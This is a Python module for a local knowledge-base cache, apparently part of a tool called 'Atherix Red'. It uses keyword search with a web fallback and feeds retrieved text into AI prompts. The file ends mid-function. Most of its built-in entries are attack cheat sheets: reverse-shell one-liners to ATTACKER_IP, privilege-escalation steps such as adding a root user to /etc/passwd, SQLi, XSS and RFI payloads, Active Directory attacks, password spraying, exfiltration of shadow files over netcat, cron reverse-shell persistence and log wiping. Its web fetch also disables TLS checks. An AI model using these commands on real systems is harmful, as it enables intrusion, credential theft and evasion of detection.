"""
Atherix Red - Knowledge Base
Local cached documentation with keyword search.
- Caches web search results and full page fetches locally
- Pre-built knowledge entries for common topics
- Searches local cache first (instant), falls back to web
- Grows smarter over time as more topics get cached
"""
 
import os
import json
import re
import math
import requests
from datetime import datetime, timedelta
from collections import Counter
 
BASE_DIR = "C:\\atherix-red"
KB_DIR = os.path.join(BASE_DIR, "knowledge_base")
CACHE_FILE = os.path.join(KB_DIR, "cache.json")
INDEX_FILE = os.path.join(KB_DIR, "index.json")
os.makedirs(KB_DIR, exist_ok=True)
 
# ============================================================
# KNOWLEDGE CACHE
# ============================================================
def load_cache():
    if os.path.exists(CACHE_FILE):
        with open(CACHE_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    return {}
 
def save_cache(cache):
    with open(CACHE_FILE, "w", encoding="utf-8") as f:
        json.dump(cache, f, indent=2, ensure_ascii=False)
 
def cache_entry(topic, content, source="manual", ttl_days=30):
    """Cache a knowledge entry. TTL controls how long before it's considered stale."""
    cache = load_cache()
    key = topic.lower().strip()
    cache[key] = {
        "topic": topic,
        "content": content[:20000],
        "source": source,
        "cached": datetime.now().isoformat(),
        "expires": (datetime.now() + timedelta(days=ttl_days)).isoformat(),
        "hits": 0
    }
    save_cache(cache)
 
def get_cached(topic):
    """Get a cached entry if it exists and hasn't expired."""
    cache = load_cache()
    key = topic.lower().strip()
    if key in cache:
        entry = cache[key]
        if datetime.now().isoformat() < entry.get("expires", ""):
            entry["hits"] = entry.get("hits", 0) + 1
            save_cache(cache)
            return entry["content"]
    return None
 
# ============================================================
# KEYWORD SEARCH INDEX
# ============================================================
def tokenize(text):
    """Simple word tokenization"""
    return re.findall(r'\b[a-zA-Z_][a-zA-Z0-9_]{2,}\b', text.lower())
 
def build_index():
    """Build a keyword index over all cached entries"""
    cache = load_cache()
    index = {}
    
    for key, entry in cache.items():
        tokens = tokenize(entry.get("topic", "") + " " + entry.get("content", "")[:5000])
        token_counts = Counter(tokens)
        for token, count in token_counts.items():
            if token not in index:
                index[token] = []
            index[token].append({"key": key, "count": count})
    
    with open(INDEX_FILE, "w", encoding="utf-8") as f:
        json.dump(index, f)
    
    return index
 
def search_kb(query, max_results=3):
    """Search the local knowledge base using keyword matching with TF-IDF-like scoring."""
    cache = load_cache()
    if not cache:
        return []
    
    # Load or build index
    if os.path.exists(INDEX_FILE):
        with open(INDEX_FILE, "r", encoding="utf-8") as f:
            index = json.load(f)
    else:
        index = build_index()
    
    query_tokens = tokenize(query)
    if not query_tokens:
        return []
    
    # Score each document
    scores = {}
    num_docs = len(cache)
    
    for token in query_tokens:
        if token in index:
            # IDF-like weight: rarer terms matter more
            doc_freq = len(index[token])
            idf = math.log(num_docs / (1 + doc_freq)) + 1
            
            for entry in index[token]:
                key = entry["key"]
                tf = entry["count"]
                if key not in scores:
                    scores[key] = 0
                scores[key] += tf * idf
    
    # Sort by score
    ranked = sorted(scores.items(), key=lambda x: x[1], reverse=True)
    
    results = []
    for key, score in ranked[:max_results]:
        if key in cache:
            results.append({
                "topic": cache[key].get("topic", key),
                "content": cache[key].get("content", "")[:4000],
                "score": round(score, 2),
                "source": cache[key].get("source", "unknown")
            })
    
    return results
 
# ============================================================
# SMART SEARCH: local first, web fallback
# ============================================================
def smart_search(query, max_results=3):
    """Search local KB first, fall back to web if nothing good found."""
    # Try local first
    local_results = search_kb(query, max_results)
    
    if local_results and local_results[0]["score"] > 5.0:
        # Good local match found
        return {
            "source": "local_cache",
            "results": local_results
        }
    
    # Fall back to web search
    try:
        from duckduckgo_search import DDGS
        web_results = []
        with DDGS() as ddgs:
            for r in ddgs.text(query, max_results=max_results):
                web_results.append({
                    "title": r.get("title", ""),
                    "url": r.get("href", ""),
                    "snippet": r.get("body", "")[:600]
                })
        
        # Cache the web results for next time
        if web_results:
            combined = "\n\n".join([
                f"Source: {r['title']}\nURL: {r['url']}\n{r['snippet']}"
                for r in web_results
            ])
            cache_entry(query, combined, source="web_search", ttl_days=2)
            
            # Try to fetch top result for deeper content
            top_url = web_results[0].get("url", "")
            if top_url:
                try:
                    resp = requests.get(top_url, headers={"User-Agent": "Mozilla/5.0"}, timeout=10, verify=False)
                    if resp.status_code == 200:
                        clean = re.sub(r'<script[^>]*>.*?</script>', '', resp.text, flags=re.DOTALL)
                        clean = re.sub(r'<style[^>]*>.*?</style>', '', clean, flags=re.DOTALL)
                        clean = re.sub(r'<[^>]+>', ' ', clean)
                        clean = re.sub(r'\s+', ' ', clean).strip()
                        if len(clean) > 200:
                            # Cache the full page too
                            cache_entry(f"page:{top_url}", clean[:15000], source="web_fetch", ttl_days=14)
                            web_results.append({
                                "title": f"Full page: {web_results[0]['title']}",
                                "url": top_url,
                                "snippet": clean[:4000]
                            })
                except:
                    pass
            
            # Rebuild index with new entries
            build_index()
        
        return {
            "source": "web_search",
            "results": [{"topic": r.get("title",""), "content": r.get("snippet",""), "score": 0}
                       for r in web_results]
        }
    
    except ImportError:
        return {"source": "none", "results": []}
    except Exception as e:
        return {"source": "error", "results": [], "error": str(e)}
 
# ============================================================
# PRE-BUILT KNOWLEDGE ENTRIES
# ============================================================
BUILT_IN_KNOWLEDGE = {
    "chrome extension manifest v3 service worker": """
Chrome Extension Manifest V3 — Service Worker Guide (2024)
 
KEY DIFFERENCES FROM MV2:
- Background pages replaced with service workers
- service_worker field instead of scripts array
- No DOM access (no document, no window)
- No localStorage (use chrome.storage.local)
- chrome.runtime.getBackgroundPage() removed entirely
- chrome.browserAction replaced with chrome.action
- Service workers are event-driven and can be terminated when idle
 
MANIFEST.JSON FORMAT:
{
    "manifest_version": 3,
    "name": "Extension Name",
    "version": "1.0",
    "permissions": ["storage", "activeTab", "alarms"],
    "host_permissions": ["http://*/*", "https://*/*"],
    "background": {
        "service_worker": "bg.js"
    },
    "action": {
        "default_popup": "popup.html",
        "default_icon": "icon.png"
    },
    "content_scripts": [{
        "matches": ["<all_urls>"],
        "js": ["content.js"]
    }]
}
 
SERVICE WORKER (bg.js) — AVAILABLE APIs:
- chrome.runtime.onInstalled.addListener()
- chrome.runtime.onMessage.addListener()
- chrome.storage.local.get() / .set()
- chrome.alarms.create() / .onAlarm.addListener()
- chrome.tabs.query() / .create() / .update()
- chrome.action.onClicked.addListener()
- chrome.webRequest (with permissions)
- chrome.declarativeNetRequest
- fetch() for network requests
- self.addEventListener() for service worker events
- importScripts() for loading additional scripts
 
NOT AVAILABLE IN SERVICE WORKER:
- document (anything)
- window (anything)
- localStorage / sessionStorage
- alert() / confirm() / prompt()
- DOM manipulation
- DOMContentLoaded event
- XMLHttpRequest (use fetch instead)
 
COMMUNICATION PATTERNS:
Content Script → Service Worker:
  chrome.runtime.sendMessage({type: "action", data: value}, (response) => {...});
  
Service Worker → Content Script:
  chrome.tabs.sendMessage(tabId, {type: "action", data: value}, (response) => {...});
 
Popup → Service Worker:
  chrome.runtime.sendMessage({type: "action"}, (response) => {...});
 
PERSISTENT STATE (service workers get terminated):
- Use chrome.storage.local for data that must persist
- Use chrome.alarms for periodic tasks (not setInterval)
- Re-register event listeners on service worker startup
""",
 
    "python requests library": """
Python Requests Library — Quick Reference
 
BASIC USAGE:
import requests
 
# GET request
response = requests.get("https://example.com")
print(response.status_code)  # 200
print(response.text)         # HTML content
print(response.json())       # Parse JSON response
 
# POST request
response = requests.post("https://api.example.com/data",
    json={"key": "value"},
    headers={"Authorization": "Bearer TOKEN"})
 
# With query parameters
response = requests.get("https://api.example.com/search",
    params={"q": "python", "limit": 10})
 
# File upload
files = {"file": open("report.pdf", "rb")}
response = requests.post("https://upload.example.com", files=files)
 
# Session (maintains cookies across requests)
session = requests.Session()
session.headers.update({"User-Agent": "MyApp/1.0"})
session.get("https://example.com/login")
session.post("https://example.com/login", data={"user": "admin", "pass": "secret"})
 
# Error handling
try:
    response = requests.get("https://example.com", timeout=10)
    response.raise_for_status()  # Raises exception for 4xx/5xx
except requests.exceptions.Timeout:
    print("Request timed out")
except requests.exceptions.HTTPError as e:
    print(f"HTTP error: {e}")
except requests.exceptions.ConnectionError:
    print("Connection failed")
 
# Disable SSL verification (for testing only)
response = requests.get("https://self-signed.example.com", verify=False)
 
# Proxy
proxies = {"http": "http://proxy:8080", "https": "http://proxy:8080"}
response = requests.get("https://example.com", proxies=proxies)
""",
 
    "nmap commands cheat sheet": """
Nmap Command Cheat Sheet — Common Scans
 
DISCOVERY:
nmap -sn 192.168.1.0/24          # Ping sweep (find live hosts)
nmap -sn -PS22,80,443 TARGET     # TCP SYN ping on specific ports
nmap -sn -PU TARGET              # UDP ping
 
PORT SCANNING:
nmap TARGET                      # Top 1000 ports (default)
nmap -p- TARGET                  # All 65535 ports
nmap -p 80,443,8080 TARGET       # Specific ports
nmap -p 1-1000 TARGET            # Port range
nmap -F TARGET                   # Fast scan (top 100 ports)
nmap --top-ports 200 TARGET      # Top 200 ports
 
SCAN TYPES:
nmap -sS TARGET                  # SYN scan (stealth, default with root)
nmap -sT TARGET                  # TCP connect scan (no root needed)
nmap -sU TARGET                  # UDP scan (slow)
nmap -sV TARGET                  # Version detection
nmap -O TARGET                   # OS detection
nmap -A TARGET                   # Aggressive (OS + version + scripts + traceroute)
 
SPEED:
nmap -T0 TARGET                  # Paranoid (very slow, IDS evasion)
nmap -T1 TARGET                  # Sneaky
nmap -T3 TARGET                  # Normal (default)
nmap -T4 TARGET                  # Aggressive (recommended for labs)
nmap -T5 TARGET                  # Insane (may miss results)
 
NSE SCRIPTS:
nmap --script=default TARGET             # Default scripts
nmap --script=vuln TARGET                # Vulnerability scripts
nmap --script=smb-vuln-ms17-010 TARGET   # Specific script
nmap --script=http-enum TARGET           # Web directory enumeration
 
OUTPUT:
nmap -oN scan.txt TARGET         # Normal output to file
nmap -oX scan.xml TARGET         # XML output
nmap -oA scan TARGET             # All formats (.nmap, .xml, .gnmap)
 
EVASION:
nmap -f TARGET                   # Fragment packets
nmap -D decoy1,decoy2 TARGET     # Decoy scan
nmap --source-port 53 TARGET     # Spoof source port
nmap --data-length 25 TARGET     # Append random data
""",
 
    "python flask web server": """
Python Flask — Quick Reference
 
MINIMAL APP:
from flask import Flask, request, jsonify
app = Flask(__name__)
 
@app.route("/")
def home():
    return "Hello World"
 
@app.route("/api/data", methods=["GET", "POST"])
def api_data():
    if request.method == "POST":
        data = request.json  # Parse JSON body
        return jsonify({"received": data, "status": "ok"})
    return jsonify({"message": "Send a POST request"})
 
if __name__ == "__main__":
    app.run(port=5000, debug=True)
 
COMMON PATTERNS:
# URL parameters
@app.route("/user/<username>")
def user_profile(username):
    return f"User: {username}"
 
# Query parameters: /search?q=python&limit=10
@app.route("/search")
def search():
    query = request.args.get("q", "")
    limit = request.args.get("limit", 10, type=int)
    return jsonify({"query": query, "limit": limit})
 
# File upload
@app.route("/upload", methods=["POST"])
def upload():
    file = request.files["file"]
    file.save(f"./uploads/{file.filename}")
    return jsonify({"filename": file.filename})
 
# CORS (cross-origin requests)
from flask_cors import CORS
CORS(app)
 
# Static files
app.static_folder = "static"
# Access at /static/filename
 
# Templates
from flask import render_template
@app.route("/page")
def page():
    return render_template("page.html", title="My Page")
""",
 
    "reverse shell one liners": """
Reverse Shell One-Liners — Common Languages
 
BASH:
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'
 
PYTHON:
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
 
NETCAT:
nc -e /bin/sh ATTACKER_IP PORT
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP PORT >/tmp/f
 
PHP:
php -r '$s=fsockopen("ATTACKER_IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
 
PERL:
perl -e 'use Socket;$i="ATTACKER_IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'
 
POWERSHELL:
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 
LISTENER (on attacker machine):
nc -lvnp PORT
rlwrap nc -lvnp PORT  (with readline support)
 
UPGRADE TO INTERACTIVE TTY:
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Then: Ctrl+Z
stty raw -echo; fg
export TERM=xterm
""",

    "linux privilege escalation": """
Linux Privilege Escalation — Full Methodology

PHASE 1 — SITUATIONAL AWARENESS (run these first):
id                                    # Who am I? What groups?
whoami && hostname                    # Current user and box name
uname -a                              # Kernel version (look for kernel exploits)
cat /etc/os-release                   # Distro and version
env                                   # Environment variables (look for creds)
echo $PATH                            # Writable PATH dirs = hijack opportunity
history                               # Command history (passwords, keys)

PHASE 2 — QUICK WINS (check these before anything else):
sudo -l                               # Can I run anything as root? #1 check
find / -perm -4000 2>/dev/null        # SUID binaries — check GTFOBins for each
find / -perm -2000 2>/dev/null        # SGID binaries
cat /etc/crontab                      # Cron jobs running as root
ls -la /etc/cron.*                    # Cron directories
crontab -l                            # Current user's crontab
systemctl list-timers                 # Systemd timers

PHASE 3 — CREDENTIAL HUNTING:
find / -name "*.conf" -o -name "*.cfg" -o -name "*.ini" 2>/dev/null | head -20
find / -name "*.bak" -o -name "*.old" -o -name "*.backup" 2>/dev/null
cat /etc/shadow 2>/dev/null           # If readable = game over
cat /etc/passwd                       # Look for users with shells
grep -r "password" /etc/ 2>/dev/null  # Password strings in configs
grep -r "password" /var/www/ 2>/dev/null  # Web app configs
find / -name "id_rsa" -o -name "id_ed25519" 2>/dev/null  # SSH keys
cat ~/.ssh/authorized_keys            # Who can SSH in as me?
cat /home/*/.bash_history 2>/dev/null # Other users' history

PHASE 4 — SERVICES AND NETWORK:
ss -tlnp                              # Listening services (look for internal-only)
netstat -tlnp 2>/dev/null             # Same thing, older syntax
ip a                                  # Network interfaces (dual-homed?)
cat /etc/hosts                        # Internal hostnames
mount                                 # Mounted filesystems (NFS? writable?)
cat /etc/fstab                        # Auto-mount entries
df -h                                 # Disk usage and mounts

PHASE 5 — FILE SYSTEM:
find / -writable -type f 2>/dev/null | grep -v proc  # World-writable files
find / -writable -type d 2>/dev/null | head -20       # Writable directories
ls -la /opt/ /srv/ /var/               # Common app install locations
ls -la /tmp/ /dev/shm/                 # World-writable temp dirs
getcap -r / 2>/dev/null                # Capabilities (python3 cap_setuid = root)

PHASE 6 — AUTOMATED TOOLS:
# LinPEAS (comprehensive):
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
# LinEnum:
./LinEnum.sh -t
# pspy (monitors processes without root):
./pspy64

COMMON EXPLOIT PATHS:
- sudo -l shows NOPASSWD entries → check GTFOBins.github.io
- SUID binary not in GTFOBins → check for known CVEs for that binary version
- Writable /etc/passwd → add root-level user: echo 'hacker:$(openssl passwd -1 pass123):0:0::/root:/bin/bash' >> /etc/passwd
- Writable cron script → inject reverse shell
- Kernel < 5.x → check kernel exploits (DirtyPipe CVE-2022-0847, DirtyCoW CVE-2016-5195)
- Docker group → docker run -v /:/mnt --rm -it alpine chroot /mnt sh
- lxd group → mount host filesystem via container
- Python/perl/ruby cap_setuid → import os; os.setuid(0); os.system('/bin/bash')
""",

    "windows privilege escalation": """
Windows Privilege Escalation — Full Methodology

PHASE 1 — SITUATIONAL AWARENESS:
whoami /all                           # User, groups, AND privileges
systeminfo                            # OS version, hotfixes, architecture
net user                              # All local users
net localgroup administrators         # Who's admin?
hostname                              # Machine name
ipconfig /all                         # Network info
set                                   # Environment variables

PHASE 2 — QUICK WINS:
# Unquoted service paths — if service path has spaces and no quotes, inject exe
wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\\Windows"
# Writable service binaries
icacls "C:\\path\\to\\service.exe"
# AlwaysInstallElevated (MSI installs as SYSTEM)
reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
# Stored credentials
cmdkey /list
# AutoLogon creds in registry
reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" 2>nul | findstr "DefaultPassword"

PHASE 3 — CREDENTIAL HUNTING:
findstr /si "password" *.txt *.ini *.config *.xml
dir /s *pass* *cred* *vnc* *.config 2>nul
type C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt
# SAM/SYSTEM backup files
dir /s SAM SYSTEM 2>nul
# WiFi passwords
netsh wlan show profiles
netsh wlan show profile name="SSID" key=clear

PHASE 4 — SERVICES AND SCHEDULED TASKS:
sc query state=all                    # All services
schtasks /query /fo LIST /v           # Scheduled tasks (look for SYSTEM)
tasklist /v                           # Running processes
# Weak service permissions
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv "Everyone" * /accepteula

PHASE 5 — TOKEN AND POTATO ATTACKS:
# Check for SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege
whoami /priv
# If either is enabled → Potato attacks:
# PrintSpoofer, GodPotato, JuicyPotato, SweetPotato, RoguePotato
# PrintSpoofer (works on Win10/Server 2019+):
PrintSpoofer.exe -i -c cmd
# GodPotato (works on newer Windows):
GodPotato.exe -cmd "cmd /c whoami"

AUTOMATED TOOLS:
# WinPEAS:
winpeas.exe
# PowerUp:
powershell -ep bypass -c "Import-Module .\\PowerUp.ps1; Invoke-AllChecks"
# Seatbelt (C#):
Seatbelt.exe -group=all
# SharpUp:
SharpUp.exe audit
""",

    "web application pentest methodology": """
Web Application Pentest — Full Methodology

PHASE 1 — RECONNAISSANCE:
# Technology fingerprinting
whatweb http://TARGET                 # Identify tech stack
wappalyzer (browser extension)        # CMS, frameworks, libraries
curl -I http://TARGET                 # Response headers (server, x-powered-by)
# Check robots.txt and sitemap
curl http://TARGET/robots.txt
curl http://TARGET/sitemap.xml

PHASE 2 — DIRECTORY AND FILE ENUMERATION:
# Gobuster (fast, Go-based):
gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt -t 50
gobuster dir -u http://TARGET -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,txt,bak
# Feroxbuster (recursive, Rust-based):
feroxbuster -u http://TARGET -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
# ffuf (fast fuzzer):
ffuf -u http://TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,301,302,403

PHASE 3 — VULNERABILITY SCANNING:
# Nikto (web vuln scanner):
nikto -h http://TARGET
# Nuclei (template-based scanner):
nuclei -u http://TARGET -t cves/ -t vulnerabilities/
# WPScan (WordPress only):
wpscan --url http://TARGET --enumerate vp,vt,u

PHASE 4 — MANUAL TESTING (OWASP TOP 10):

SQL Injection:
- Test: ' OR 1=1-- -     in login forms, search, URL params
- Union-based: ' UNION SELECT 1,2,3,4-- -
- Blind: ' AND 1=1-- -   vs   ' AND 1=2-- -
- Time-based: ' AND SLEEP(5)-- -
- Tool: sqlmap -u "http://TARGET/page?id=1" --batch --dbs

XSS (Cross-Site Scripting):
- Reflected: <script>alert(1)</script>
- Stored: test in comments, profiles, any persistent input
- DOM: check JavaScript that uses location.hash, document.referrer
- Bypasses: <img src=x onerror=alert(1)>  <svg onload=alert(1)>

Command Injection:
- Test: ; id    |id    $(id)    `id`
- Blind: ; sleep 5    ; ping -c 5 ATTACKER_IP

LFI/RFI (File Inclusion):
- LFI: ?page=../../../etc/passwd
- LFI with null byte: ?page=../../../etc/passwd%00
- PHP wrappers: ?page=php://filter/convert.base64-encode/resource=index
- RFI: ?page=http://ATTACKER/shell.php

SSRF (Server-Side Request Forgery):
- Test: url=http://127.0.0.1:80  url=http://169.254.169.254/latest/meta-data
- Cloud metadata: http://169.254.169.254 (AWS), http://metadata.google.internal (GCP)

IDOR (Insecure Direct Object Reference):
- Change IDs in URLs: /api/user/1 → /api/user/2
- Change IDs in POST bodies and cookies

Authentication:
- Default creds: admin/admin, admin/password
- Brute force: hydra -l admin -P /usr/share/wordlists/rockyou.txt http-post-form "TARGET"
- JWT: decode at jwt.io, test none algorithm, weak secret

PHASE 5 — EXPLOITATION:
# Metasploit (when you have a known CVE):
msfconsole
use exploit/multi/http/MODULE_NAME
set RHOSTS TARGET
set LHOST ATTACKER_IP
exploit
""",

    "active directory pentest": """
Active Directory Pentest — Methodology

PHASE 1 — INITIAL ENUMERATION (no creds):
# Find domain controllers
nmap -p 389,636,88,53 SUBNET/24
# LDAP anonymous bind
ldapsearch -x -H ldap://DC_IP -b "dc=domain,dc=local"
# SMB null session
smbclient -L //DC_IP -N
crackmapexec smb DC_IP -u "" -p ""
# Enumerate users via Kerberos (no auth required)
kerbrute userenum -d domain.local /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc DC_IP

PHASE 2 — WITH CREDENTIALS:
# Validate creds
crackmapexec smb DC_IP -u 'user' -p 'password'
# Enumerate everything with BloodHound
bloodhound-python -u 'user' -p 'password' -d domain.local -ns DC_IP -c all
# Then import into BloodHound GUI and look for:
# - Shortest path to Domain Admin
# - Kerberoastable users
# - AS-REP roastable users
# - Users with DCSync rights

# LDAP enumeration
ldapdomaindump -u 'domain\\user' -p 'password' DC_IP
# Shares
crackmapexec smb DC_IP -u 'user' -p 'password' --shares
smbmap -u 'user' -p 'password' -H DC_IP

PHASE 3 — ATTACKS:
# Kerberoasting (extract service account hashes)
impacket-GetUserSPNs -request -dc-ip DC_IP domain.local/user:password
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt

# AS-REP Roasting (accounts with no preauth)
impacket-GetNPUsers -dc-ip DC_IP domain.local/ -usersfile users.txt -no-pass
hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt

# Pass the Hash
crackmapexec smb DC_IP -u 'admin' -H 'NTLM_HASH'
impacket-psexec -hashes :NTLM_HASH admin@DC_IP
impacket-wmiexec -hashes :NTLM_HASH admin@DC_IP

# DCSync (need Replicating Directory Changes privilege)
impacket-secretsdump -just-dc domain.local/admin:password@DC_IP

# ZeroLogon (CVE-2020-1472) — test only:
python3 zerologon_tester.py DC_NAME DC_IP

PHASE 4 — LATERAL MOVEMENT:
# WinRM
evil-winrm -i TARGET_IP -u admin -p password
# PSExec
impacket-psexec domain.local/admin:password@TARGET_IP
# RDP
xfreerdp /v:TARGET_IP /u:admin /p:password /dynamic-resolution
# DCOM
impacket-dcomexec domain.local/admin:password@TARGET_IP

PHASE 5 — PERSISTENCE:
# Golden Ticket (need krbtgt hash from DCSync)
impacket-ticketer -nthash KRBTGT_HASH -domain-sid DOMAIN_SID -domain domain.local administrator
export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass domain.local/administrator@DC_IP
""",

    "network enumeration and scanning": """
Network Enumeration — Tools and Techniques

HOST DISCOVERY:
nmap -sn 10.10.10.0/24                  # Ping sweep
arp-scan -l                              # ARP scan (local subnet only)
fping -a -g 10.10.10.0/24 2>/dev/null   # Fast ping sweep
netdiscover -r 10.10.10.0/24            # ARP-based discovery

DNS ENUMERATION:
dig axfr domain.com @ns1.domain.com     # Zone transfer (if allowed)
dig any domain.com                       # All DNS records
host -l domain.com ns1.domain.com        # Zone transfer alt
dnsrecon -d domain.com -t std            # Standard enumeration
dnsrecon -d domain.com -t brt            # Brute force subdomains
subfinder -d domain.com -o subs.txt      # Passive subdomain enum
amass enum -d domain.com                 # Advanced subdomain enum

SMB ENUMERATION (445):
smbclient -L //TARGET -N                 # List shares (null session)
smbmap -H TARGET                         # Map shares and permissions
enum4linux-ng TARGET                     # Full SMB/RPC enumeration
crackmapexec smb TARGET --shares         # Quick share listing
nmap --script smb-enum-shares,smb-enum-users -p 445 TARGET

SNMP (161):
snmpwalk -v2c -c public TARGET           # Walk MIB tree
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt TARGET
snmp-check TARGET                        # Detailed SNMP check

LDAP (389/636):
ldapsearch -x -H ldap://TARGET -b "" -s base namingContexts  # Find base DN
ldapsearch -x -H ldap://TARGET -b "dc=domain,dc=local"       # Dump directory

FTP (21):
ftp TARGET                               # Try anonymous login
nmap --script ftp-anon,ftp-bounce,ftp-vsftpd-backdoor -p 21 TARGET

SSH (22):
ssh-audit TARGET                         # Audit SSH config
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://TARGET  # Brute force

HTTP/HTTPS (80/443):
curl -I TARGET                           # Headers
whatweb TARGET                           # Technology detection
nikto -h TARGET                          # Vulnerability scan
gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt  # Dir enum

MYSQL (3306):
mysql -h TARGET -u root -p               # Try root with no password
nmap --script mysql-enum -p 3306 TARGET

REDIS (6379):
redis-cli -h TARGET                      # Connect (often no auth)
redis-cli -h TARGET INFO                 # Server info
""",

    "password attacks and cracking": """
Password Attacks — Methodology and Tools

ONLINE ATTACKS (against live services):
# Hydra — most versatile
hydra -l admin -P /usr/share/wordlists/rockyou.txt TARGET ssh
hydra -l admin -P /usr/share/wordlists/rockyou.txt TARGET ftp
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt TARGET smb
hydra -l admin -P /usr/share/wordlists/rockyou.txt http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"
# CrackMapExec — AD/SMB specific
crackmapexec smb TARGET -u users.txt -p passwords.txt --continue-on-success
# Spray a single password across many users (avoids lockout)
crackmapexec smb TARGET -u users.txt -p 'Summer2024!' --continue-on-success

OFFLINE CRACKING (against hashes):
# Hashcat (GPU-accelerated)
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt         # MD5
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt      # NTLM
hashcat -m 1800 hashes.txt /usr/share/wordlists/rockyou.txt      # sha512crypt
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt     # Kerberoast
hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt     # AS-REP
hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt      # bcrypt
# With rules for smarter cracking:
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --show hashes.txt                    # Show cracked passwords

HASH IDENTIFICATION:
hashid 'HASH_VALUE'
hash-identifier                           # Interactive
# Common patterns:
# 32 hex chars = MD5 or NTLM
# 64 hex chars = SHA-256
# $1$ prefix = md5crypt
# $6$ prefix = sha512crypt (Linux /etc/shadow)
# $2b$ prefix = bcrypt

EXTRACTING HASHES:
# Linux
cat /etc/shadow                           # Requires root
unshadow /etc/passwd /etc/shadow > hashes.txt
# Windows SAM
reg save HKLM\\SAM sam.bak
reg save HKLM\\SYSTEM system.bak
impacket-secretsdump -sam sam.bak -system system.bak LOCAL
# NTDS.dit (Domain Controller)
impacket-secretsdump -ntds ntds.dit -system system.bak LOCAL
""",

    "post exploitation": """
Post-Exploitation — After Getting Access

DATA EXFILTRATION:
# Compress and exfil
tar czf /tmp/loot.tar.gz /etc/shadow /etc/passwd /home/*/.*history
python3 -m http.server 8000             # Serve files
# On attacker: wget http://TARGET:8000/loot.tar.gz
# Or via nc:
nc -lvnp 9999 > loot.tar.gz             # Attacker listens
cat /tmp/loot.tar.gz | nc ATTACKER 9999  # Target sends

PIVOTING (reach internal networks):
# SSH port forward
ssh -L 8080:INTERNAL_TARGET:80 user@COMPROMISED_HOST
# SSH dynamic SOCKS proxy
ssh -D 9050 user@COMPROMISED_HOST
proxychains nmap -sT INTERNAL_TARGET     # Route through proxy
# Chisel (no SSH needed)
# On attacker: ./chisel server -p 8000 --reverse
# On target: ./chisel client ATTACKER:8000 R:socks

MAINTAINING ACCESS:
# SSH key persistence
mkdir -p ~/.ssh && echo "YOUR_PUBLIC_KEY" >> ~/.ssh/authorized_keys
# Cron persistence (Linux)
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER/PORT 0>&1'" >> /var/spool/cron/root
# Scheduled task (Windows)
schtasks /create /tn "Update" /tr "powershell -ep bypass -c IEX(...)" /sc minute /mo 5 /ru SYSTEM

COVERING TRACKS:
# Clear bash history
history -c && history -w
# Clear logs
echo "" > /var/log/auth.log
echo "" > /var/log/syslog
# Timestomping
touch -r /etc/passwd /tmp/evil_file      # Match timestamp to legitimate file
"""
}
 
def populate_built_in():
    """Load built-in knowledge entries into the cache."""
    cache = load_cache()
    added = 0
    for topic, content in BUILT_IN_KNOWLEDGE.items():
        key = topic.lower().strip()
        if key not in cache:
            cache_entry(topic, content.strip(), source="built_in", ttl_days=365)
            added += 1
    if added > 0:
        build_index()
    return added
 
# Auto-populate on import
populate_built_in()
 
# ============================================================
# INTEGRATION HELPER
# ============================================================
def get_knowledge_for_prompt(prompt, max_chars=6000):
    """Get relevant knowledge for a given prompt. Returns formatted string for injection."""
    results = smart_search(prompt, max_results=3)
    
